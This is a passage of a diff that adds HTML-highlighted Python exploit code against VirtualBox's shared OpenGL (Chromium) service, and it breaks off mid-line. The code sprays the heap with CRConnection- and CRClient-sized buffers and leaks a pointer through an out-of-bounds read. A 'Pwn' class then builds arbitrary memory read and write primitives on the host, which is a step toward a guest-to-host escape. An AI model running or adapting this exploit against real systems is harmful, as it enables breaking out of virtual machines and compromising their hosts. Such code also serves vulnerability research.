+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;leak_conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;sd&quot;&gt;&#39;&#39;&#39; Return a CRConnection address, and the associated client handle &#39;&#39;&#39;&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Spray some buffers of sizes&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#  0x290 = sizeof(CRConnection) and&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#  0x9d0 = sizeof(CRClient)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# This will allocate a CRClient and CRConnection right next to each other.&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;hgcm_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Leak pClient member of CRConnection struct, and from that compute&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# CRConnection address.&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make_oob_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OFFSET_CONN_CLIENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;pClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pClient&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9e0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pClient&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        
+        &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_HOSTBUF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_HOSTBUFSZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&amp;lt;Q&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;leak_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# TODO maybe spray even more?&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# self.master_id, self.master, _ = leak_buf(self.client1)&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# print(&#39;[*] Header for buffer # %d is at 0x%016x (master)&#39; % (self.master_id, self.master))&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# self.victim_id, self.victim, _ = leak_buf(self.client1)&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;# print(&#39;[*] Header for buffer # %d is at 0x%016x (victim)&#39; % (self.victim_id, self.victim))&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak_conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span 